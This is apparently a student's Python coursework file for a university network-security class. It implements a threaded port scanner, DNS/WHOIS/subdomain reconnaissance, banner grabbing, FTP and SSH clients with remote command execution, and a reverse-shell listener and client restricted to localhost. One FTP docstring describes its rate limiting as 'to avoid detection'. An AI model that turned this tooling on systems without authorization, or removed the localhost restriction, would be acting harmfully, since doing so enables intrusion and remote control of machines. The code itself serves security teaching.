"""
Network Port Scanner & TCP Server - Information & Network Security Programming
605346 - University of Petra
Phase 1 + Phase 2: Port Scanner + TCP Server + Reconnaissance + FTP + SSH + Reverse Shell
"""

import socket
import argparse
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import shutil

# ============= PHASE 2 - NEW IMPORTS =============
import dns.resolver
import whois
import ftplib
import paramiko
import time
# =================================================

file_lock = threading.Lock()
LOGS_DIR = "scan_logs"

if not os.path.exists(LOGS_DIR):
    os.makedirs(LOGS_DIR)
    print(f"[+] Created logs directory: {LOGS_DIR}")


# ================= PHASE 1 FUNCTIONS =================

def scan_single_port(target_host: str, port: int, timeout: float = 1.0) -> tuple:
    """Scan a single TCP port using socket.connect_ex()"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target_host, port))
        sock.close()
        if result == 0:
            return (port, True, "OPEN")
        else:
            return (port, False, "CLOSED")
    except:
        return (port, False, "ERROR")


def scan_ports(target: str, ports: list, max_workers: int = 100, timeout: float = 1.0):
    """Scan ports using ThreadPoolExecutor"""
    print(f"\n[+] Scanning {target} on {len(ports)} ports...")
    open_ports = []
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"scan_{timestamp}.txt"
    filepath = os.path.join(LOGS_DIR, filename)
    
    if os.path.exists(filepath):
        backup_path = filepath + ".backup"
        shutil.copy(filepath, backup_path)
        print(f"[+] Backup created: {backup_path}")
    
    with open(filepath, 'w') as f:
        f.write("=" * 70 + "\n")
        f.write("PORT SCAN RESULTS\n")
        f.write(f"Target: {target}\n")
        f.write(f"Started: {datetime.now()}\n")
        f.write("=" * 70 + "\n")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(scan_single_port, target, p, timeout): p for p in ports}
        
        for future in as_completed(futures):
            port, is_open, status = future.result()
            if is_open:
                print(f"  ✅ Port {port}: OPEN")
                open_ports.append(port)
            else:
                print(f"  ❌ Port {port}: {status}")
            
            with file_lock:
                with open(filepath, 'a') as f:
                    f.write(f"Port {port}: {status}\n")
    
    with open(filepath, 'a') as f:
        f.write("=" * 70 + "\n")
        f.write(f"Completed: {datetime.now()}\n")
        f.write(f"Open ports: {open_ports}\n")
    
    print(f"\n[+] Results saved to: {filepath}")
    return open_ports


def handle_client(conn: socket.socket, addr: tuple):
    """Handle TCP client connection"""
    print(f"[+] New connection from {addr}")
    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            message = data.decode().strip()
            print(f"[{addr}] Received: {message}")
            response = f"Echo: {message}\n"
            conn.send(response.encode())
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        conn.close()
        print(f"[-] Connection closed: {addr}")


def start_tcp_server(host: str = '127.0.0.1', port: int = 8888, max_clients: int = 5):
    """TCP Server with bind, listen, accept"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    server.bind((host, port))
    print(f"[*] bind() completed on {host}:{port}")
    
    server.listen(max_clients)
    print(f"[*] listen() started with backlog {max_clients}")
    print(f"[*] TCP Server waiting for connections...")
    
    try:
        while True:
            conn, addr = server.accept()
            print(f"[*] accept() got connection from {addr}")
            
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.daemon = True
            client_thread.start()
            print(f"[*] Active threads: {threading.active_count()}")
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
    finally:
        server.close()


def parse_ports(ports_input: str) -> list:
    """Parse ports like '20-100' or '22,80,443' or '80'"""
    ports = []
    if '-' in ports_input:
        start, end = map(int, ports_input.split('-'))
        ports = list(range(start, end + 1))
    elif ',' in ports_input:
        ports = [int(p.strip()) for p in ports_input.split(',')]
    else:
        ports = [int(ports_input)]
    return ports


# ================= PHASE 2 FUNCTIONS =================

def dns_enumeration(target: str, log_func):
    """DNS enumeration: A, AAAA, MX, NS, TXT records"""
    log_func("\n[+] DNS Enumeration")
    log_func("-" * 40)
    
    records = ['A', 'AAAA', 'MX', 'NS', 'TXT']
    
    for record in records:
        try:
            answers = dns.resolver.resolve(target, record)
            for rdata in answers:
                log_func(f"  {record}: {rdata}")
        except Exception as e:
            log_func(f"  {record}: None ({str(e)[:50]})")


def whois_lookup(target: str, log_func):
    """WHOIS query for domain information"""
    log_func("\n[+] WHOIS Lookup")
    log_func("-" * 40)
    
    try:
        domain_info = whois.whois(target)
        log_func(f"  Domain: {domain_info.domain_name}")
        log_func(f"  Registrar: {domain_info.registrar}")
        log_func(f"  Creation Date: {domain_info.creation_date}")
        log_func(f"  Expiration Date: {domain_info.expiration_date}")
        log_func(f"  Name Servers: {domain_info.name_servers}")
        return domain_info
    except Exception as e:
        log_func(f"  [!] WHOIS failed: {e}")
        return None


def banner_grab(host: str, port: int, timeout: float = 3.0):
    """Grab banner from a service on specific port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.send(b"\n")
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner
    except:
        return None


def http_header_inspection(target: str, log_func):
    """Get HTTP headers from web server"""
    log_func("\n[+] HTTP Header Inspection")
    log_func("-" * 40)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5.0)
        sock.connect((target, 80))
        
        request = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"
        sock.send(request.encode())
        
        response = b""
        while True:
            data = sock.recv(4096)
            if not data:
                break
            response += data
        
        sock.close()
        
        headers = response.decode().split('\r\n\r\n')[0]
        log_func(headers)
        return headers
    except Exception as e:
        log_func(f"  [!] HTTP inspection failed: {e}")
        return None


def subdomain_bruteforce(target: str, log_func):
    """Brute force subdomains using a simple wordlist"""
    log_func("\n[+] Subdomain Brute Force")
    log_func("-" * 40)
    
    wordlist = ['www', 'mail', 'ftp', 'localhost', 'webmail', 
                'smtp', 'pop', 'ns1', 'webdisk', 'ns2', 
                'cpanel', 'whm', 'autodiscover', 'autoconfig']
    
    found = False
    for sub in wordlist:
        subdomain = f"{sub}.{target}"
        try:
            answers = dns.resolver.resolve(subdomain, 'A')
            if answers:
                found = True
                log_func(f"  ✅ Found: {subdomain} -> {answers[0]}")
        except Exception:
            continue

    if not found:
        log_func("  No subdomains found from wordlist")


def banner_grabbing_common_ports(target: str, log_func):
    """Grab banners from common ports"""
    log_func("\n[+] Banner Grabbing (Common Ports)")
    log_func("-" * 40)
    common_ports = [21, 22, 25, 80, 443, 3306, 8080]
    for port in common_ports:
        banner = banner_grab(target, port)
        if banner:
            log_func(f"  Port {port}: {banner[:100]}")
        else:
            log_func(f"  Port {port}: No banner or timeout")


def run_reconnaissance(target: str):
    """Run all reconnaissance techniques and save results"""
    print("\n" + "=" * 60)
    print("  RECONNAISSANCE MODE")
    print(f"  Target: {target}")
    print("=" * 60)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_target = target.replace('.', '_')
    log_file = os.path.join(LOGS_DIR, f"recon_{safe_target}_{timestamp}.txt")
    
    log_lines = []
    
    def log_and_print(message):
        print(message)
        log_lines.append(message)
    
    try:
        dns_enumeration(target, log_and_print)
        whois_lookup(target, log_and_print)
        banner_grabbing_common_ports(target, log_and_print)
        http_header_inspection(target, log_and_print)
        subdomain_bruteforce(target, log_and_print)
        
        with open(log_file, 'w', encoding='utf-8') as f:
            f.write("=" * 70 + "\n")
            f.write("RECONNAISSANCE REPORT\n")
            f.write(f"Target: {target}\n")
            f.write(f"Date: {datetime.now()}\n")
            f.write("=" * 70 + "\n\n")
            f.write("\n".join(log_lines))
        
        print(f"\n[+] Reconnaissance results saved to: {log_file}")
        
    except Exception as e:
        print(f"\n[!] Error during reconnaissance: {e}")
    
    return log_file

# ================= FTP MODULE =================

def ftp_connect(host: str, username: str, password: str, port: int = 21, rate_limit: float = 0.5):
    """Connect to FTP server with rate limiting to avoid detection"""
    try:
        # Rate limiting - delay before connection
        time.sleep(rate_limit)
        
        ftp = ftplib.FTP()
        ftp.connect(host, port)
        
        # Rate limiting before login
        time.sleep(rate_limit)
        ftp.login(username, password)
        
        print(f"[+] FTP: Successfully connected to {host}")
        return ftp
    except ftplib.error_perm as e:
        print(f"[-] FTP: Authentication failed - {e}")
        return None
    except Exception as e:
        print(f"[-] FTP: Connection failed - {e}")
        return None


def ftp_list_files(ftp: ftplib.FTP, path: str = "/"):
    """List files in FTP directory"""
    try:
        print(f"\n[+] FTP: Listing directory {path}")
        print("-" * 40)
        files = ftp.nlst(path)
        for f in files[:20]:  # Limit output
            print(f"  {f}")
        if len(files) > 20:
            print(f"  ... and {len(files) - 20} more files")
        return files
    except Exception as e:
        print(f"[-] FTP: Failed to list files - {e}")
        return []


def ftp_download_file(ftp: ftplib.FTP, remote_file: str, local_file: str, rate_limit: float = 0.5):
    """Download file from FTP server with rate limiting"""
    try:
        time.sleep(rate_limit)
        with open(local_file, 'wb') as f:
            ftp.retrbinary(f'RETR {remote_file}', f.write)
        print(f"[+] FTP: Downloaded '{remote_file}' -> '{local_file}'")
        return True
    except Exception as e:
        print(f"[-] FTP: Download failed - {e}")
        return False


def ftp_upload_file(ftp: ftplib.FTP, local_file: str, remote_file: str, rate_limit: float = 0.5):
    """Upload file to FTP server with rate limiting"""
    try:
        time.sleep(rate_limit)
        with open(local_file, 'rb') as f:
            ftp.storbinary(f'STOR {remote_file}', f)
        print(f"[+] FTP: Uploaded '{local_file}' -> '{remote_file}'")
        return True
    except Exception as e:
        print(f"[-] FTP: Upload failed - {e}")
        return False


def run_ftp_client(host: str, username: str, password: str, 
                   local_file: str = None, remote_file: str = None, 
                   upload: bool = False):
    """Main FTP client function"""
    print("\n" + "=" * 60)
    print("  FTP CLIENT MODE")
    print(f"  Target: {host}")
    print("=" * 60)
    
    # Connect with rate limiting
    ftp = ftp_connect(host, username, password)
    if not ftp:
        return
    
    try:
        # List files
        ftp_list_files(ftp)
        
        # File transfer if specified
        if local_file and remote_file:
            if upload:
                ftp_upload_file(ftp, local_file, remote_file)
            else:
                ftp_download_file(ftp, remote_file, local_file)
        elif local_file or remote_file:
            print("[-] FTP: Both --local-file and --remote-file are required for transfer")
        
        ftp.quit()
        print("[+] FTP: Disconnected")
        
    except Exception as e:
        print(f"[-] FTP: Error - {e}")
        ftp.quit()
# ================= MAIN FUNCTION =================
# ================= SSH MODULE =================

def ssh_connect_password(host: str, username: str, password: str, port: int = 22):
    """Connect to SSH server using password authentication"""

    try:
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.RejectPolicy())

        client.connect(
            host,
            port=port,
            username=username,
            password=password,
            timeout=10
        )

        print(f"[+] SSH: Successfully connected to {host} with password")
        return client

    except paramiko.AuthenticationException:
        print(f"[-] SSH: Authentication failed for {username}")
        return None

    except Exception as e:
        print(f"[-] SSH: Connection failed - {e}")
        return None

def ssh_connect_key(host: str, username: str, key_path: str, port: int = 22):
    """Connect to SSH server using key-based authentication"""

    try:
        key = paramiko.RSAKey.from_private_key_file(key_path)

        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.RejectPolicy())

        client.connect(
            host,
            port=port,
            username=username,
            pkey=key,
            timeout=10
        )

        print(f"[+] SSH: Successfully connected to {host} with key")
        return client

    except Exception as e:
        print(f"[-] SSH: Key connection failed - {e}")
        return None


def ssh_exec_command(client: paramiko.SSHClient, command: str):
    """Execute remote command via SSH"""
    try:
        print(f"\n[+] SSH: Executing command: {command}")
        print("-" * 40)
        stdin, stdout, stderr = client.exec_command(command)
        
        output = stdout.read().decode()
        error = stderr.read().decode()
        
        if output:
            print(output)
        if error:
            print(f"Error: {error}")
        
        return output, error
    except Exception as e:
        print(f"[-] SSH: Command execution failed - {e}")
        return None, None


def sftp_download_file(client: paramiko.SSHClient, remote_file: str, local_file: str):
    """Download file from SSH server using SFTP"""
    try:
        sftp = client.open_sftp()
        sftp.get(remote_file, local_file)
        sftp.close()
        print(f"[+] SFTP: Downloaded '{remote_file}' -> '{local_file}'")
        return True
    except Exception as e:
        print(f"[-] SFTP: Download failed - {e}")
        return False


def sftp_upload_file(client: paramiko.SSHClient, local_file: str, remote_file: str):
    """Upload file to SSH server using SFTP"""
    try:
        sftp = client.open_sftp()
        sftp.put(local_file, remote_file)
        sftp.close()
        print(f"[+] SFTP: Uploaded '{local_file}' -> '{remote_file}'")
        return True
    except Exception as e:
        print(f"[-] SFTP: Upload failed - {e}")
        return False


def run_ssh_client(host: str, username: str, password: str = None, key_path: str = None,
                   command: str = None, local_file: str = None, remote_file: str = None,
                   upload: bool = False):
    """Main SSH client function"""
    print("\n" + "=" * 60)
    print("  SSH CLIENT MODE")
    print(f"  Target: {host}")
    print("=" * 60)
    
    # Connect with password or key
    client = None
    if key_path:
        client = ssh_connect_key(host, username, key_path)
    elif password:
        client = ssh_connect_password(host, username, password)
    else:
        print("[-] SSH: No authentication method provided (password or keyfile)")
        return
    
    if not client:
        return
    
    try:
        # Execute command if specified
        if command:
            ssh_exec_command(client, command)
        
        # File transfer if specified
        if local_file and remote_file:
            if upload:
                sftp_upload_file(client, local_file, remote_file)
            else:
                sftp_download_file(client, remote_file, local_file)
        elif local_file or remote_file:
            print("[-] SSH: Both --local-file and --remote-file are required for transfer")
        
        client.close()
        print("[+] SSH: Disconnected")
        
    except Exception as e:
        print(f"[-] SSH: Error - {e}")
        client.close()
    # ================= REVERSE SHELL MODULE (Educational - Sandboxed) =================
# 🔒 ETHICAL USE WARNING: This module works ONLY on localhost (127.0.0.1)
# 🔒 NEVER use against external systems without authorization
# 🔒 For educational purposes only - University of Petra - Phase 2

def start_listener(port: int):
    """Start a listener (server) for reverse shell connection"""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('127.0.0.1', port))
        server.listen(1)
        print(f"[*] Listener started on port {port}")
        print(f"[*] Waiting for incoming connection...")
        
        conn, addr = server.accept()
        print(f"[+] Connection received from {addr}")
        
        while True:
            command = input(f"\nShell> ")
            if command.lower() == 'exit':
                conn.send(b'exit')
                break
            
            conn.send(command.encode())
            result = conn.recv(4096).decode()
            print(result)
        
        conn.close()
        server.close()
        print("[*] Listener closed")
        
    except Exception as e:
        print(f"[-] Listener error: {e}")


def reverse_shell(lhost: str, lport: int):
    """
    Reverse shell connecting to localhost only.
    🔒 SANDBOX RESTRICTION: lhost must be 127.0.0.1 or localhost
    """
    # 🔒 Safety check - ensure only localhost
    if lhost not in ['127.0.0.1', 'localhost']:
        print("\n" + "=" * 60)
        print("  🔒 ETHICAL RESTRICTION 🔒")
        print("  Reverse shell only allowed on localhost (127.0.0.1)")
        print("  This is an educational sandbox environment.")
        print("=" * 60)
        return
    
    print("\n" + "=" * 60)
    print("  🔒 EDUCATIONAL REVERSE SHELL (SANDBOXED) 🔒")
    print(f"  Connecting to {lhost}:{lport}")
    print("  USE IN AUTHORIZED LAB ENVIRONMENT ONLY")
    print("=" * 60)
    
    try:
        # Wait a moment for the listener to be ready
        time.sleep(1)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((lhost, lport))
        print(f"[+] Connected to listener at {lhost}:{lport}")
        
        while True:
            command = sock.recv(1024).decode()
            if command.lower() == 'exit':
                break
            
            if command.strip():
                import subprocess
                result = subprocess.run(command.split(), shell=False, capture_output=True, text=True)
                output = result.stdout + result.stderr
                if not output:
                    output = "[+] Command executed (no output)\n"
                sock.send(output.encode())
        
        sock.close()
        print("[*] Reverse shell closed")
        
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        print("[*] Make sure the listener is running first!")


def run_reverse_shell_pair(lhost: str = '127.0.0.1', lport: int = 4444, as_listener: bool = True):
    """Run reverse shell in two terminals - helper function"""
    if as_listener:
        print("\n" + "=" * 50)
        print("  REVERSE SHELL - LISTENER MODE")
        print(f"  Run this FIRST on port {lport}")
        print("  Then run: python scanner.py --mode revshell --lhost 127.0.0.1 --lport 4444 --connect")
        print("=" * 50)
        start_listener(lport)
    else:
        reverse_shell(lhost, lport)
def main():
    parser = argparse.ArgumentParser(description="Network Tool: Port Scanner + Reconnaissance + Offensive Toolkit")
    
    parser.add_argument("--mode", choices=['scan', 'server', 'recon', 'ftp', 'ssh', 'revshell'], 
                        default='scan',
                        help="Mode: scan (port scanner), server (TCP server), recon (reconnaissance), ftp (FTP client), ssh (SSH client), revshell (reverse shell demo)")
    
    parser.add_argument("target", nargs='?', type=str, help="Target IP or domain (for scan/recon mode)")
    parser.add_argument("ports", nargs='?', type=str, help="Ports: 80, 20-100, 22,80,443")
    
    parser.add_argument("--host", type=str, default='127.0.0.1', help="Server bind address")
    parser.add_argument("--sport", type=int, default=8888, help="Server port")
    
    parser.add_argument("-t", "--threads", type=int, default=100, help="Max threads for scanning")
    parser.add_argument("-to", "--timeout", type=float, default=1.0, help="Connection timeout")
    
    parser.add_argument("--username", type=str, help="Username for FTP/SSH")
    parser.add_argument("--password", type=str, help="Password for FTP/SSH")
    parser.add_argument("--keyfile", type=str, help="SSH private key file path")
    parser.add_argument("--command", type=str, help="Remote command to execute (SSH mode)")
    parser.add_argument("--local-file", type=str, help="Local file path for transfer")
    parser.add_argument("--remote-file", type=str, help="Remote file path for transfer")
    parser.add_argument("--upload", action="store_true", help="Upload file instead of download")
    
    parser.add_argument("--lhost", type=str, default='127.0.0.1', help="Listener host (revshell mode)")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port (revshell mode)")
    parser.add_argument("--connect", action="store_true", help="Connect mode for reverse shell (instead of listen)")
    
    args = parser.parse_args()
    
    if args.mode == 'server':
        print("=" * 50)
        print("  TCP MULTI-CLIENT SERVER")
        print("=" * 50)
        start_tcp_server(args.host, args.sport)
    
    elif args.mode == 'scan':
        if not args.target or not args.ports:
            print("Error: For scan mode, provide target and ports")
            print("Example: python scanner.py --mode scan scanme.nmap.org 20-100")
            return
        
        print("=" * 50)
        print("  PORT SCANNER")
        print("=" * 50)
        
        ports = parse_ports(args.ports)
        scan_ports(args.target, ports, args.threads, args.timeout)
    
    elif args.mode == 'recon':
        if not args.target:
            print("Error: For recon mode, provide target domain")
            print("Example: python scanner.py --mode recon google.com")
            return
        
        print("=" * 50)
        print("  RECONNAISSANCE TOOLKIT")
        print("  DNS + WHOIS + Banner + HTTP + Subdomains")
        print("=" * 50)
        
        run_reconnaissance(args.target)
    
    elif args.mode == 'ftp':
        if not args.target or not args.username or not args.password:
            print("Error: For FTP mode, provide target, username, and password")
            print("Example: python scanner.py --mode ftp 127.0.0.1 --username test --password test")
            print("Example with file transfer: python scanner.py --mode ftp 127.0.0.1 --username test --password test --local-file test.txt --remote-file test.txt")
            print("Example upload: python scanner.py --mode ftp 127.0.0.1 --username test --password test --local-file test.txt --remote-file test.txt --upload")
            return
        
        print("=" * 50)
        print("  FTP CLIENT TOOL")
        print("  With Rate Limiting (Anti-Bruteforce)")
        print("=" * 50)
        
        run_ftp_client(args.target, args.username, args.password, 
                       args.local_file, args.remote_file, args.upload)
    
    elif args.mode == 'ssh':
        if not args.target or not args.username:
            print("Error: For SSH mode, provide target and username")
            print("And provide either --password or --keyfile")
            print("Example with password: python scanner.py --mode ssh 127.0.0.1 --username test --password test")
            print("Example with key: python scanner.py --mode ssh 127.0.0.1 --username test --keyfile id_rsa")
            print("Example with command: python scanner.py --mode ssh 127.0.0.1 --username test --password test --command 'ls -la'")
            print("Example with SFTP: python scanner.py --mode ssh 127.0.0.1 --username test --password test --local-file test.txt --remote-file test.txt")
            return
        
        print("=" * 50)
        print("  SSH CLIENT TOOL")
        print("  Password + Key Authentication + SFTP")
        print("=" * 50)
        
        run_ssh_client(args.target, args.username, args.password, 
                       args.keyfile, args.command, args.local_file, 
                       args.remote_file, args.upload)
    
    elif args.mode == 'revshell':
        # Check if user wants to connect or listen
        # By default, run as listener (server)
        # Add --connect flag to run as client
        
        connect_mode = hasattr(args, 'connect') and args.connect
        
        if not connect_mode:
            # Start as listener
            print("=" * 50)
            print("  REVERSE SHELL - LISTENER")
            print("  Waiting for shell connection on localhost")
            print("=" * 50)
            print(f"\n[!] Run in another terminal: python scanner.py --mode revshell --lhost 127.0.0.1 --lport {args.lport} --connect")
            start_listener(args.lport)
        else:
            # Start as reverse shell (client connects back)
            run_reverse_shell_pair(lhost=args.lhost, lport=args.lport, as_listener=False)

if __name__ == "__main__":
    main()